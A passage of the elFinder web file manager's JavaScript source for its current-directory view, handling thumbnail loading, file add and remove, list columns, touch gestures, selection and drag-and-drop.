						hash = fm.cwdId2Hash(n.id);
					
					if (fm.isCommandEnabled('paste', hash)) {
						if (! $n.hasClass(clDroppable+',elfinder-na,elfinder-ro')) {
							$n.droppable(droppable);
						}
					} else {
						if ($n.hasClass(clDroppable)) {
							$n.droppable('destroy');
						}
					}
					if (fm.isCommandEnabled('upload', hash)) {
						if (! $n.hasClass('native-droppable,elfinder-na,elfinder-ro')) {
							$n.addClass('native-droppable');
						}
					} else {
						if ($n.hasClass('native-droppable')) {
							$n.removeClass('native-droppable');
						}
					}
				});
			},
			
			/**
			 * Preload required thumbnails and on load add css to files.
			 * Return false if required file is not visible yet (in buffer) -
			 * required for old api to stop loading thumbnails.
			 *
			 * @param  Object  file hash -> thumbnail map
			 * @param  Bool    reload
			 * @return void
			 */
			attachThumbnails = function(tmbs, reload) {
				var attach = function(node, tmb) {
						jQuery('<img/>')
							.on('load', function() {
								node.find('.elfinder-cwd-icon').addClass(tmb.className).css('background-image', "url('"+tmb.url+"')");
							})
							.attr('src', tmb.url);
					},
					chk  = function(hash, tmb) {
						var node = fm.cwdHash2Elm(hash),
							file, tmbObj, reloads = [];
	
						if (node.length) {
							if (tmb != '1') {
								file = fm.file(hash);
								if (file.tmb !== tmb) {
									file.tmb = tmb;
								}
								tmbObj = fm.tmb(file);
								if (reload) {
									node.find('.elfinder-cwd-icon').addClass(tmbObj.className).css('background-image', "url('"+tmbObj.url+"')");
								} else {
									attach(node, tmbObj);
								}
								delete bufferExt.attachTmbs[hash];
							} else {
								if (reload) {
									loadThumbnails([hash]);
								} else if (! bufferExt.tmbLoading[hash]) {
									bufferExt.getTmbs.push(hash);
								}
							}
						}
					};

				if (jQuery.isPlainObject(tmbs) && Object.keys(tmbs).length) {
					Object.assign(bufferExt.attachTmbs, tmbs);
					jQuery.each(tmbs, chk);
					if (! reload && bufferExt.getTmbs.length && ! Object.keys(bufferExt.tmbLoading).length) {
						loadThumbnails();
					}
				}
			},
			
			/**
			 * Load thumbnails from backend.
			 *
			 * @param  Array|void reloads  hashes list for reload thumbnail items
			 * @return void
			 */
			loadThumbnails = function(reloads) {
				var tmbs = [],
					reload = false;
				
				if (fm.oldAPI) {
					fm.request({
						data : {cmd : 'tmb', current : fm.cwd().hash},
						preventFail : true
					})
					.done(function(data) {
						if (data.images && Object.keys(data.images).length) {
							attachThumbnails(data.images);
						}
						if (data.tmb) {
							loadThumbnails();
						}
					});
					return;
				} 

				if (reloads) {
					reload = true;
					tmbs = reloads.splice(0, tmbNum);
				} else {
					tmbs = bufferExt.getTmbs.splice(0, tmbNum);
				}
				if (tmbs.length) {
					if (reload || inViewHashes[tmbs[0]] || inViewHashes[tmbs[tmbs.length-1]]) {
						jQuery.each(tmbs, function(i, h) {
							bufferExt.tmbLoading[h] = true;
						});
						fm.request({
							data : {cmd : 'tmb', targets : tmbs},
							preventFail : true
						})
						.done(function(data) {
							var errs = [],
								resLen;
							if (data.images) {
								if (resLen = Object.keys(data.images).length) {
									if (resLen < tmbs.length) {
										jQuery.each(tmbs, function(i, h) {
											if (! data.images[h]) {
												errs.push(h);
											}
										});
									}
									attachThumbnails(data.images, reload);
								} else {
									errs = tmbs;
								}
								// unset error items from bufferExt.attachTmbs
								if (errs.length) {
									jQuery.each(errs, function(i, h) {
										delete bufferExt.attachTmbs[h];
									});
								}
							}
							if (reload) {
								if (reloads.length) {
									loadThumbnails(reloads);
								}
							}
						})
						.always(function() {
							bufferExt.tmbLoading = {};
							if (! reload && bufferExt.getTmbs.length) {
								loadThumbnails();
							}
						});
					}
				}
			},
			
			/**
			 * Add new files to cwd/buffer
			 *
			 * @param  Array  new files
			 * @return void
			 */
			add = function(files, mode) {
				var place    = list ? cwd.find('tbody') : cwd,
					l        = files.length, 
					atmb     = {},
					findNode = function(file) {
						var pointer = cwd.find('[id]:first'), file2;

						while (pointer.length) {
							file2 = fm.file(fm.cwdId2Hash(pointer.attr('id')));
							if (!pointer.hasClass('elfinder-cwd-parent') && file2 && fm.compare(file, file2) < 0) {
								return pointer;
							}
							pointer = pointer.next('[id]');
						}
					},
					findIndex = function(file) {
						var l = buffer.length, i;
						
						for (i =0; i < l; i++) {
							if (fm.compare(file, buffer[i]) < 0) {
								return i;
							}
						}
						return l || -1;
					},
					// created document fragment for jQuery >= 1.12, 2.2, 3.0
					// see Studio-42/elFinder#1544 @ github
					docFlag = jQuery.htmlPrefilter? true : false,
					tempDom = docFlag? jQuery(document.createDocumentFragment()) : jQuery('<div></div>'),
					file, hash, node, nodes, ndx, stmb;

				if (l > showFiles) {
					// re-render for performance tune
					content();
					selectedFiles = fm.arrayFlip(jQuery.map(files, function(f) { return f.hash; }), true);
					trigger();
				} else {
					// add the item immediately
					l && wz.removeClass('elfinder-cwd-wrapper-empty');
					
					// Self thumbnail
					stmb = (fm.option('tmbUrl') === 'self');
					
					while (l--) {
						file = files[l];
						hash = file.hash;
						
						if (fm.cwdHash2Elm(hash).length) {
							continue;
						}
						
						if ((node = findNode(file)) && ! node.length) {
							node = null;
						}
						if (! node && (ndx = findIndex(file)) >= 0) {
							buffer.splice(ndx, 0, file);
						} else {
							tempDom.empty().append(itemhtml(file));
							(file.mime === 'directory') && !mobile && makeDroppable(tempDom);
							nodes = docFlag? tempDom : tempDom.children();
							if (node) {
								node.before(nodes);
							} else {
								place.append(nodes);
							}
							++bufferExt.renderd;
						}
						
						if (fm.cwdHash2Elm(hash).length) {
							if ((file.tmb && (file.tmb != 1 || file.size > 0)) || (stmb && file.mime.indexOf('image/') === 0)) {
								atmb[hash] = file.tmb || 'self';
							}
						}
					}
	
					if (list) {
						setColwidth();
						fixTableHeader({fitWidth: ! colWidth});
					}
					bottomMarkerShow(place);
					if (Object.keys(atmb).length) {
						Object.assign(bufferExt.attachTmbs, atmb);
						if (buffer.length < 1) {
							loadThumbnails();
						}
					}
				}
			},
			
			/**
			 * Remove files from cwd/buffer
			 *
			 * @param  Array  files hashes
			 * @return void
			 */
			remove = function(files) {
				var l = files.length,
					inSearch = fm.searchStatus.state > 1,
					curCmd = fm.getCommand(fm.currentReqCmd) || {},
					hash, n, ndx, found;

				// removed cwd
				if (!fm.cwd().hash && !curCmd.noChangeDirOnRemovedCwd) {
					jQuery.each(cwdParents.reverse(), function(i, h) {
						if (fm.file(h)) {
							found = true;
							fm.one(fm.currentReqCmd + 'done', function() {
								!fm.cwd().hash && fm.exec('open', h);
							});
							return false;
						}
					});
					// fallback to fm.roots[0]
					!found && !fm.cwd().hash && fm.exec('open', fm.roots[Object.keys(fm.roots)[0]]);
					return;
				}
				
				while (l--) {
					hash = files[l];
					if ((n = fm.cwdHash2Elm(hash)).length) {
						try {
							n.remove();
							--bufferExt.renderd;
						} catch(e) {
							fm.debug('error', e);
						}
					} else if ((ndx = index(hash)) !== -1) {
						buffer.splice(ndx, 1);
					}
					selectedFiles[hash] && delete selectedFiles[hash];
					if (inSearch) {
						if ((ndx = jQuery.inArray(hash, cwdHashes)) !== -1) {
							cwdHashes.splice(ndx, 1);
						}
					}
				}
				
				inSearch && fm.trigger('cwdhasheschange', cwdHashes);
				
				if (list) {
					setColwidth();
					fixTableHeader({fitWidth: ! colWidth});
				}
			},
			
			customColsNameBuild = function() {
				var name = '',
				customColsName = '';
				for (var i = 0; i < customCols.length; i++) {
					name = fm.getColumnName(customCols[i]);
					customColsName +='<td class="elfinder-cwd-view-th-'+customCols[i]+' sortable-item">'+name+'</td>';
				}
				return customColsName;
			},
			
			setItemBoxSize = function(boxSize) {
				var place, elm;
				if (!boxSize.height) {
					place = (list ? cwd.find('tbody') : cwd);
					elm = place.find(list? 'tr:first' : '[id]:first');
					boxSize.height = elm.outerHeight(true);
					if (!list) {
						boxSize.width = elm.outerWidth(true);
					}
				}
			},

			bottomMarkerShow = function(cur, cnt) {
				var place = cur || (list ? cwd.find('tbody') : cwd),
					boxSize = itemBoxSize[fm.viewType],
					col = 1,
					row;

				if (buffer.length > 0) {
					if (!bufferExt.hpi) {
						setItemBoxSize(boxSize);
						if (! list) {
							col = Math.floor(place.width() / boxSize.width);
							bufferExt.row = boxSize.height;
							bufferExt.hpi = bufferExt.row / col;
						} else {
							bufferExt.row = bufferExt.hpi = boxSize.height;
						}
					} else if (!list) {
						col = Math.floor(place.width() / boxSize.width);
					}
					row = Math.ceil((buffer.length + (cnt || 0)) / col);
					if (list && tableHeader) {
						++row;
					}
					bottomMarker.css({top: (bufferExt.row * row) + 'px'}).show();
				}
			},
			
			wrapperContextMenu = {
				contextmenu : function(e) {
					e.preventDefault();
					if (cwd.data('longtap') !== void(0)) {
						e.stopPropagation();
						return;
					}
					fm.trigger('contextmenu', {
						'type'    : 'cwd',
						'targets' : [fm.cwd().hash],
						'x'       : e.pageX,
						'y'       : e.pageY
					});
				},
				touchstart : function(e) {
					if (e.originalEvent.touches.length > 1) {
						return;
					}
					if (cwd.data('longtap') !== false) {
						wrapper.data('touching', {x: e.originalEvent.touches[0].pageX, y: e.originalEvent.touches[0].pageY});
						cwd.data('tmlongtap', setTimeout(function(){
							// long tap
							cwd.data('longtap', true);
							fm.trigger('contextmenu', {
								'type'    : 'cwd',
								'targets' : [fm.cwd().hash],
								'x'       : wrapper.data('touching').x,
								'y'       : wrapper.data('touching').y
							});
						}, 500));
					}
					cwd.data('longtap', null);
				},
				touchend : function(e) {
					if (e.type === 'touchmove') {
						if (! wrapper.data('touching') ||
								( Math.abs(wrapper.data('touching').x - e.originalEvent.touches[0].pageX)
								+ Math.abs(wrapper.data('touching').y - e.originalEvent.touches[0].pageY)) > 4) {
							wrapper.data('touching', null);
						}
					} else {
						setTimeout(function() {
							cwd.removeData('longtap');
						}, 80);
					}
					clearTimeout(cwd.data('tmlongtap'));
				},
				click : function(e) {
					if (cwd.data('longtap')) {
						e.preventDefault();
						e.stopPropagation();
					}
				}
			},
			
			/**
			 * Update directory content
			 *
			 * @return void
			 */
			content = function() {
				fm.lazy(function() {
					var phash, emptyMethod, thtr;

					wz.append(selectAllCheckbox).removeClass('elfinder-cwd-wrapper-empty elfinder-search-result elfinder-incsearch-result elfinder-letsearch-result');
					if (fm.searchStatus.state > 1 || fm.searchStatus.ininc) {
						wz.addClass('elfinder-search-result' + (fm.searchStatus.ininc? ' elfinder-'+(query.substr(0,1) === '/' ? 'let':'inc')+'search-result' : ''));
					}
					
					// abort attachThumbJob
					bufferExt.attachThumbJob && bufferExt.attachThumbJob._abort();
					
					// destroy selectable for GC
					cwd.data('selectable') && cwd.selectable('disable').selectable('destroy').removeData('selectable');
					
					// notify cwd init
					fm.trigger('cwdinit');
					
					selectedNext = jQuery();
					try {
						// to avoid problem with draggable
						cwd.empty();
					} catch (e) {
						cwd.html('');
					}
					
					if (tableHeader) {
						wrapper.off('scroll.fixheader resize.fixheader');
						tableHeader.remove();
						tableHeader = null;
					}

					cwd.removeClass('elfinder-cwd-view-icons elfinder-cwd-view-list')
						.addClass('elfinder-cwd-view-'+(list ? 'list' :'icons'))
						.attr('style', '')
						.css('height', 'auto');
					bottomMarker.hide();

					wrapper[list ? 'addClass' : 'removeClass']('elfinder-cwd-wrapper-list')._padding = parseInt(wrapper.css('padding-top')) + parseInt(wrapper.css('padding-bottom'));
					if (fm.UA.iOS) {
						wrapper.removeClass('overflow-scrolling-touch').addClass('overflow-scrolling-touch');
					}

					if (list) {
						cwd.html('<table><thead></thead><tbody></tbody></table>');
						thtr = jQuery('<tr class="ui-state-default"><td class="elfinder-cwd-view-th-name">'+fm.getColumnName('name')+'</td>'+customColsNameBuild()+'</tr>');
						cwd.find('thead').hide().append(thtr).find('td:first').append(selectAllCheckbox);
						if (jQuery.fn.sortable) {
							thtr.addClass('touch-punch touch-punch-keep-default')
								.sortable({
								axis: 'x',
								distance: 8,
								items: '> .sortable-item',
								start: function(e, ui) {
									jQuery(ui.item[0]).data('dragging', true);
									ui.placeholder
										.width(ui.helper.removeClass('ui-state-hover').width())
										.removeClass('ui-state-active')
										.addClass('ui-state-hover')
										.css('visibility', 'visible');
								},
								update: function(e, ui){
									var target = jQuery(ui.item[0]).attr('class').split(' ')[0].replace('elfinder-cwd-view-th-', ''),
										prev, done;
									customCols = jQuery.map(jQuery(this).children(), function(n) {
										var name = jQuery(n).attr('class').split(' ')[0].replace('elfinder-cwd-view-th-', '');
										if (! done) {
											if (target === name) {
												done = true;
											} else {
												prev = name;
											}
										}
										return (name === 'name')? null : name;
									});
									templates.row = makeTemplateRow();
									fm.storage('cwdCols', customCols);
									prev = '.elfinder-col-'+prev+':first';
									target = '.elfinder-col-'+target+':first';
									fm.lazy(function() {
										cwd.find('tbody tr').each(function() {
											var $this = jQuery(this);
											$this.children(prev).after($this.children(target));
										});
									});
								},
								stop: function(e, ui) {
									setTimeout(function() {
										jQuery(ui.item[0]).removeData('dragging');
									}, 100);
								}
							});
						}

						thtr.find('td').addClass('touch-punch').resizable({
							handles: fm.direction === 'ltr'? 'e' : 'w',
							start: function(e, ui) {
								var target = cwd.find('td.elfinder-col-'
									+ ui.element.attr('class').split(' ')[0].replace('elfinder-cwd-view-th-', '')
									+ ':first');
								
								ui.element
									.data('dragging', true)
									.data('resizeTarget', target)
									.data('targetWidth', target.width());
								colResizing = true;
								if (cwd.find('table').css('table-layout') !== 'fixed') {
									cwd.find('tbody tr:first td').each(function() {
										jQuery(this).width(jQuery(this).width());
									});
									cwd.find('table').css('table-layout', 'fixed');
								}
							},
							resize: function(e, ui) {
								ui.element.data('resizeTarget').width(ui.element.data('targetWidth') - (ui.originalSize.width - ui.size.width));
							},
							stop : function(e, ui) {
								colResizing = false;
								fixTableHeader({fitWidth: true});
								colWidth = {};
								cwd.find('tbody tr:first td').each(function() {
									var name = jQuery(this).attr('class').split(' ')[0].replace('elfinder-col-', '');
									colWidth[name] = jQuery(this).width();
								});
								fm.storage('cwdColWidth', colWidth);
								setTimeout(function() {
									ui.element.removeData('dragging');
								}, 100);
							}
						})
						.find('.ui-resizable-handle').addClass('ui-icon ui-icon-grip-dotted-vertical');
					}

					buffer = jQuery.map(incHashes || cwdHashes, function(hash) { return fm.file(hash) || null; });
					
					buffer = fm.sortFiles(buffer);
					
					if (incHashes) {
						incHashes = jQuery.map(buffer, function(f) { return f.hash; });
					} else {
						cwdHashes = jQuery.map(buffer, function(f) { return f.hash; });
					}
					
					bufferExt = {
						renderd: 0,
						attachTmbs: {},
						getTmbs: [],
						tmbLoading: {},
						lazyOpts: { tm : 0 }
					};
					
					wz[(buffer.length < 1) ? 'addClass' : 'removeClass']('elfinder-cwd-wrapper-empty');
					wrapper.off(scrollEvent, render).on(scrollEvent, render).trigger(scrollEvent);
					
					// set droppable
					if (!fm.cwd().write) {
						wrapper.removeClass('native-droppable')
						       .droppable('disable')
						       .removeClass('ui-state-disabled'); // for old jQueryUI see https://bugs.jqueryui.com/ticket/5974
					} else {
						wrapper[fm.isCommandEnabled('upload')? 'addClass' : 'removeClass']('native-droppable');
						wrapper.droppable(fm.isCommandEnabled('paste')? 'enable' : 'disable');
					}
				});
			},
			
			/**
			 * CWD node itself
			 *
			 * @type JQuery
			 **/
			cwd = jQuery(this)
				.addClass('ui-helper-clearfix elfinder-cwd')
				.attr('unselectable', 'on')
				// fix ui.selectable bugs and add shift+click support 
				.on('click.'+fm.namespace, fileSelector, function(e) {
					var p    = this.id ? jQuery(this) : jQuery(this).parents('[id]:first'),
						tgt  = jQuery(e.target),
						prev,
						next,
						pl,
						nl,
						sib;

					if (selectCheckbox && (tgt.is('input:checkbox.'+clSelChk) || tgt.hasClass('elfinder-cwd-select'))) {
						e.stopPropagation();
						e.preventDefault();
						p.trigger(p.hasClass(clSelected) ? evtUnselect : evtSelect);
						trigger();
						requestAnimationFrame(function() {
							tgt.prop('checked', p.hasClass(clSelected));
						});
						return;
					}

					if (cwd.data('longtap') || tgt.hasClass('elfinder-cwd-nonselect')) {
						e.stopPropagation();
						return;
					}

					if (!curClickId) {
						curClickId = p.attr('id');
						setTimeout(function() {
							curClickId = '';
						}, 500);
					}
					
					if (e.shiftKey) {
						prev = p.prevAll(lastSelect || '.'+clSelected+':first');
						next = p.nextAll(lastSelect || '.'+clSelected+':first');
						pl   = prev.length;
						nl   = next.length;
					}
					if (e.shiftKey && (pl || nl)) {
						sib = pl ? p.prevUntil('#'+prev.attr('id')) : p.nextUntil('#'+next.attr('id'));
						sib = sib.add(p);
						if (!pl) {
							sib  = jQuery(sib.get().reverse());
						}
						sib.trigger(evtSelect);
					} else if (e.ctrlKey || e.metaKey) {
						p.trigger(p.hasClass(clSelected) ? evtUnselect : evtSelect);
					} else {
						if (wrapper.data('touching') && p.hasClass(clSelected)) {
							wrapper.data('touching', null);
							fm.dblclick({file : fm.cwdId2Hash(this.id)});
							return;
						} else {
							unselectAll({ notrigger: true });
							p.trigger(evtSelect);
						}
					}

					trigger();
				})
				// call fm.open()
				.on('dblclick.'+fm.namespace, fileSelector, function(e) {
					if (curClickId) {
						var hash = fm.cwdId2Hash(curClickId);
						e.stopPropagation();
						if (this.id !== curClickId) {
							jQuery(this).trigger(evtUnselect);
							jQuery('#'+curClickId).trigger(evtSelect);
							trigger();
						}
						fm.dblclick({file : hash});
					}
				})
				// for touch device
				.on('touchstart.'+fm.namespace, fileSelector, function(e) {
					if (e.originalEvent.touches.length > 1) {
						return;
					}
					var p   = this.id ? jQuery(this) : jQuery(this).parents('[id]:first'),
						tgt = jQuery(e.target),
						nodeName = e.target.nodeName,
						sel;
					
					if ((nodeName === 'INPUT' && e.target.type === 'text') || nodeName === 'TEXTAREA' || tgt.hasClass('elfinder-cwd-nonselect')) {
						e.stopPropagation();
						return;
					}
					
					// now name editing
					if (p.find('input:text,textarea').length) {
						e.stopPropagation();
						e.preventDefault();
						return;
					}
					
					wrapper.data('touching', {x: e.originalEvent.touches[0].pageX, y: e.originalEvent.touches[0].pageY});
					if (selectCheckbox && (tgt.is('input:checkbox.'+clSelChk) || tgt.hasClass('elfinder-cwd-select'))) {
						return;
					}
					
					sel = p.prevAll('.'+clSelected+':first').length +
					      p.nextAll('.'+clSelected+':first').length;
					cwd.data('longtap', null);
					if (Object.keys(selectedFiles).length
						||
						(list && e.target.nodeName !== 'TD')
						||
						(!list && this !== e.target)
					) {
						cwd.data('longtap', false);
						p.addClass(clHover);
						p.data('tmlongtap', setTimeout(function(){
							// long tap
							cwd.data('longtap', true);
							p.trigger(evtSelect);
							trigger();
							fm.trigger('contextmenu', {
								'type'    : 'files',
								'targets' : fm.selected(),
								'x'       : e.originalEvent.touches[0].pageX,
								'y'       : e.originalEvent.touches[0].pageY
							});
						}, 500));
					}
				})
				.on('touchmove.'+fm.namespace+' touchend.'+fm.namespace, fileSelector, function(e) {
					var tgt = jQuery(e.target),
						p;
					if (selectCheckbox && (tgt.is('input:checkbox.'+clSelChk) || tgt.hasClass('elfinder-cwd-select'))) {
						return;
					}
					if (e.target.nodeName == 'INPUT' || e.target.nodeName == 'TEXTAREA') {
						e.stopPropagation();
						return;
					}
					p = this.id ? jQuery(this) : jQuery(this).parents('[id]:first');
					clearTimeout(p.data('tmlongtap'));
					if (e.type === 'touchmove') {
						wrapper.data('touching', null);
						p.removeClass(clHover);
					} else {
						if (wrapper.data('touching') && !cwd.data('longtap') && p.hasClass(clSelected)) {
							e.preventDefault();
							wrapper.data('touching', null);
							fm.dblclick({file : fm.cwdId2Hash(this.id)});
						}
						setTimeout(function() {
							cwd.removeData('longtap');
						}, 80);
					}
				})
				// attach draggable
				.on('mouseenter.'+fm.namespace, fileSelector, function(e) {
					if (scrolling) { return; }
					var $this = jQuery(this), helper = null;

					if (!mobile && !$this.data('dragRegisted') && !$this.hasClass(clTmp) && !$this.hasClass(clDraggable) && !$this.hasClass(clDisabled)) {
						$this.data('dragRegisted', true);
						if (!fm.isCommandEnabled('copy', fm.searchStatus.state > 1 || $this.hasClass('isroot')? fm.cwdId2Hash($this.attr('id')) : void 0) &&
							!fm.isCommandEnabled('cut', fm.searchStatus.state > 1 || $this.hasClass('isroot')? fm.cwdId2Hash($this.attr('id')) : void 0)) {
							return;
						}
						$this.on('mousedown', function(e) {
							// shiftKey or altKey + drag start for HTML5 native drag function
							// Note: can no use shiftKey with the Google Chrome 
							var metaKey = options.metakeyDragout && !fm.UA.IE && (e.shiftKey || e.altKey),
								disable = false;
							if (metaKey && cwd.data('selectable')) {
								// destroy jQuery-ui selectable while trigger native drag
								cwd.selectable('disable').selectable('destroy').removeData('selectable');
								requestAnimationFrame(function(){
									cwd.selectable(selectableOption).selectable('option', {disabled: false}).selectable('refresh').data('selectable', true);
								});
							}
							$this.removeClass('ui-state-disabled');
							if (metaKey) {
								$this.draggable('option', 'disabled', true).attr('draggable', 'true');
							} else {
								if (!$this.hasClass(clSelected)) {
									if (list) {
										disable = jQuery(e.target).closest('span,tr').is('tr');
									} else {
										disable = jQuery(e.target).hasClass('elfinder-cwd-file');
									}
								}
								if (disable) {
									// removeClass('ui-state-disabled') for old version of jQueryUI
									$this.draggable('option', 'disabled', true).removeClass('ui-state-disabled');
								} else {
									$this.draggable('option', 'disabled', false)
										  .removeAttr('draggable')
									      .draggable('option', 'cursorAt', {left: 50 - parseInt(jQuery(e.currentTarget).css('margin-left')), top: 47});
								}
							}
						})
						.on('dragstart', function(e) {
							var dt = e.dataTransfer || e.originalEvent.dataTransfer || null;
							helper = null;
							if (dt && !fm.UA.IE) {
								var p = this.id ? jQuery(this) : jQuery(this).parents('[id]:first'),
									elm   = jQuery('<span>'),
									url   = '',
									durl  = null,
									murl  = null,
									files = [],
									icon  = function(f) {
										var mime = f.mime, i, tmb = fm.tmb(f);
										i = '<div class="elfinder-cwd-icon elfinder-cwd-icon-drag '+fm.mime2class(mime)+' ui-corner-all"></div>';
										if (tmb) {
											i = jQuery(i).addClass(tmb.className).css('background-image', "url('"+tmb.url+"')").get(0).outerHTML;
										}
										return i;
									}, l, geturl = [];
								p.trigger(evtSelect);
								trigger();
								jQuery.each(selectedFiles, function(v){
									var file = fm.file(v),
										furl = file.url;
									if (file && file.mime !== 'directory') {
										if (!furl) {
											furl = fm.url(file.hash);
										} else if (furl == '1') {
											geturl.push(v);
											return true;
										}
										if (furl) {
											furl = fm.convAbsUrl(furl);
											files.push(v);
											jQuery('<a>').attr('href', furl).text(furl).appendTo(elm);
											url += furl + "\n";
											if (!durl) {
												durl = file.mime + ':' + file.name + ':' + furl;
											}
											if (!murl) {
												murl = furl + "\n" + file.name;
											}
										}
									}
								});
								if (geturl.length) {
									jQuery.each(geturl, function(i, v){
										var rfile = fm.file(v);
										rfile.url = '';
										fm.request({
											data : {cmd : 'url', target : v},
											notify : {type : 'url', cnt : 1},
											preventDefault : true
										})
										.always(function(data) {
											rfile.url = data.url? data.url : '1';
										});
									});
									return false;
								} else if (url) {
									if (dt.setDragImage) {
										helper = jQuery('<div class="elfinder-drag-helper html5-native"></div>').append(icon(fm.file(files[0]))).appendTo(jQuery(document.body));
										if ((l = files.length) > 1) {
											helper.append(icon(fm.file(files[l-1])) + '<span class="elfinder-drag-num">'+l+'</span>');
										}
										dt.setDragImage(helper.get(0), 50, 47);
									}
									dt.effectAllowed = 'copyLink';
									dt.setData('DownloadURL', durl);
									dt.setData('text/x-moz-url', murl);
									dt.setData('text/uri-list', url);
									dt.setData('text/plain', url);
									dt.setData('text/html', elm.html());
									dt.setData('elfinderfrom', window.location.href + fm.cwd().hash);
									dt.setData('elfinderfrom:' + dt.getData('elfinderfrom'), '');
								} else {
									return false;
								}
							}
						})
						.on('dragend', function(e){
							unselectAll({ notrigger: true });
							helper && helper.remove();
						})
						.draggable(fm.draggable);
					}
				})
				// add hover class to selected file
				.on(evtSelect, fileSelector, function(e) {
					var $this = jQuery(this),
						id    = fm.cwdId2Hash($this.attr('id'));
					
					if (!selectLock && !$this.hasClass(clDisabled)) {
						lastSelect = '#'+ this.id;
						$this.addClass(clSelected).children().addClass(clHover).find('input:checkbox.'+clSelChk).prop('checked', true);
						if (! selectedFiles[id]) {
							selectedFiles[id] = true;
						}
						// will be selected next
						selectedNext = cwd.find('[id].'+clSelected+':last').next();
					}
				})
				// remove hover class from unselected file
				.on(evtUnselect, fileSelector, function(e) {
					var $this = jQuery(this), 
						id    = fm.cwdId2Hash($this.attr('id'));
					
					if (!selectLock) {
						$this.removeClass(clSelected).children().removeClass(clHover).find('input:checkbox.'+clSelChk).prop('checked', false);
						if (cwd.hasClass('elfinder-cwd-allselected')) {
							selectCheckbox && selectAllCheckbox.children('input').prop('checked', false);
							cwd.removeClass('elfinder-cwd-allselected');
						}
						selectedFiles[id] && delete selectedFiles[id];
					}
					
				})
				// disable files wich removing or moving
				.on(evtDisable, fileSelector, function() {
					var $this  = jQuery(this).removeClass(clHover+' '+clSelected).addClass(clDisabled), 
						child  = $this.children(),
						target = (list ? $this : child.find('div.elfinder-cwd-file-wrapper,div.elfinder-cwd-filename'));
					
					child.removeClass(clHover+' '+clSelected);
					
					$this.hasClass(clDroppable) && $this.droppable('disable');
					target.hasClass(clDraggable) && target.draggable('disable');
				})
				// if any files was not removed/moved - unlock its
				.on(evtEnable, fileSelector, function() {
					var $this  = jQuery(this).removeClass(clDisabled), 
						target = list ? $this : $this.children('div.elfinder-cwd-file-wrapper,div.elfinder-cwd-filename');
					
					$this.hasClass(clDroppable) && $this.droppable('enable');	
					target.hasClass(clDraggable) && target.draggable('enable');
				})
				.on('scrolltoview', fileSelector, function(e, data) {
					scrollToView(jQuery(this), (data && typeof data.blink !== 'undefined')? data.blink : true);
				})
				.on('mouseenter.'+fm.namespace+' mouseleave.'+fm.namespace, fileSelector, function(e) {
					var enter = (e.type === 'mouseenter');
					if (enter && (scrolling || fm.UA.Mobile)) { return; }
					fm.trigger('hover', {hash : fm.cwdId2Hash(jQuery(this).attr('id')), type : e.type});
					jQuery(this).toggleClass(clHover, (e.type == 'mouseenter'));
				})
				// for file contextmenu
				.on('mouseenter.'+fm.namespace+' mouseleave.'+fm.namespace, '.elfinder-cwd-file-wrapper,.elfinder-cwd-filename', function(e) {
					var enter = (e.type === 'mouseenter');
					if (enter && scrolling) { return; }
					jQuery(this).closest(fileSelector).children('.elfinder-cwd-file-wrapper,.elfinder-cwd-filename').toggleClass(clActive, (e.type == 'mouseenter'));
				})
				.on('contextmenu.'+fm.namespace, function(e) {
					var file = jQuery(e.target).closest(fileSelector);
					
					if (file.get(0) === e.target && !selectedFiles[fm.cwdId2Hash(file.get(0).id)]) {
						return;
					}

					// now filename editing
					if (file.find('input:text,textarea').length) {
						e.stopPropagation();
						return;
					}
					
					if (file.length && (e.target.nodeName != 'TD' || selectedFiles[fm.cwdId2Hash(file.get(0).id)])) {
						e.stopPropagation();
						e.preventDefault();
						if (!file.hasClass(clDisabled) && !wrapper.data('touching')) {
							if (!file.hasClass(clSelected)) {
								unselectAll({ notrigger: true });
								file.trigger(evtSelect);
								trigger();
							}
							fm.trigger('contextmenu', {
								'type'    : 'files',
								'targets' : fm.selected(),
								'x'       : e.pageX,
								'y'       : e.pageY
							});

						}
						
					}
				})
				// unselect all on cwd click
				.on('click.'+fm.namespace, function(e) {
					if (e.target === this && ! cwd.data('longtap')) {
						!e.shiftKey && !e.ctrlKey && !e.metaKey && unselectAll();
					}
				})
				// prepend fake file/dir
				.on('create.'+fm.namespace, function(e, f) {
					var parent = list ? cwd.find('tbody') : cwd,
						p = parent.find('.elfinder-cwd-parent'),
						lock = f.move || false,
						file = jQuery(itemhtml(f)).addClass(clTmp),
						selected = fm.selected();
						
					if (selected.length) {
						lock && fm.trigger('lockfiles', {files: selected});
					} else {
						unselectAll();
					}

					if (p.length) {
						p.after(file);
					} else {
						parent.prepend(file);
					}
					
					setColwidth();
					wrapper.scrollTop(0).scrollLeft(0);
				})
				// unselect all selected files
				.on('unselectall', unselectAll)
				.on('selectfile', function(e, id) {
					fm.cwdHash2Elm(id).trigger(evtSelect);
					trigger();
				})
				.on('colwidth', function() {
					if (list) {
						cwd.find('table').css('table-layout', '')
							.find('td').css('width', '');
						fixTableHeader({fitWidth: true});
						fm.storage('cwdColWidth', colWidth = null);
					}
				})
				.on('iconpref', function(e, data) {
					cwd.removeClass(function(i, cName) {
						return (cName.match(/\belfinder-cwd-size\S+/g) || []).join(' ');
					});
					iconSize = data? (parseInt(data.size) || 0) : 0;
					if (!list) {
						if (iconSize > 0) {
							cwd.addClass('elfinder-cwd-size' + iconSize);
						}
						if (bufferExt.renderd) {
							requestAnimationFrame(function() {
								itemBoxSize.icons = {};
								bufferExt.hpi = null;
								bottomMarkerShow(cwd, bufferExt.renderd);
								wrapperRepaint();
							});
						}
					}
				})
				// Change icon size with mouse wheel event
				.on('onwheel' in document ? 'wheel' : 'mousewheel', function(e) {
					var tm, size, delta;
					if (!list && ((e.ctrlKey && !e.metaKey) || (!e.ctrlKey && e.metaKey))) {
						e.stopPropagation();
						e.preventDefault();
						tm = cwd.data('wheelTm');
						if (typeof tm !== 'undefined') {
							clearTimeout(tm);
							cwd.data('wheelTm', setTimeout(function() {
								cwd.removeData('wheelTm');
							}, 200));
						} else {
							cwd.data('wheelTm', false);
							size = iconSize || 0;
							delta = e.originalEvent.deltaY ? e.originalEvent.deltaY : -(e.originalEvent.wheelDelta);
							if (delta > 0) {
								if (iconSize > 0) {
									size = iconSize - 1;
								}
							} else {
								if (iconSize < options.iconsView.sizeMax) {
									size = iconSize + 1;
								}
							}
							if (size !== iconSize) {
								fm.storage('iconsize', size);
								cwd.trigger('iconpref', {size: size});
							}
						}
					}
				}),
			wrapper = jQuery('<div class="elfinder-cwd-wrapper"></div>')
				// make cwd itself droppable for folders from nav panel
				.droppable(Object.assign({}, droppable, {autoDisable: false}))
				.on('contextmenu.'+fm.namespace, wrapperContextMenu.contextmenu)
				.on('touchstart.'+fm.namespace, wrapperContextMenu.touchstart)
